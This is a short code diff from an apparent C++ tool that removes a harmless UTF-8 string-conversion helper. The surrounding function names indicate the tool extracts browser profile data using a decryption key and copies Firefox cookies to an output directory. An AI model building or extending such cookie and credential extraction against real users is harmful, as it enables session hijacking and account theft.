@@ -978,15 +978,6 @@ void extract_all_profiles_data(const std::vector<uint8_t>& v20_key, const Browse
 }
 
 
-std::string to_narrow_string(const wchar_t* w_str) {
-    if (!w_str) return "";
-    int size = WideCharToMultiByte(CP_UTF8, 0, w_str, -1, NULL, 0, NULL, NULL);
-    if (size <= 0) return "";
-    std::string res(size, '\0');
-    WideCharToMultiByte(CP_UTF8, 0, w_str, -1, &res[0], size, NULL, NULL);
-    if (!res.empty() && res.back() == '\0') res.pop_back();
-    return res;
-}
 // Final check
 
 void extract_firefox_cookies(const fs::path& profile_path, const fs::path& output_dir, const std::string& temp_prefix) {
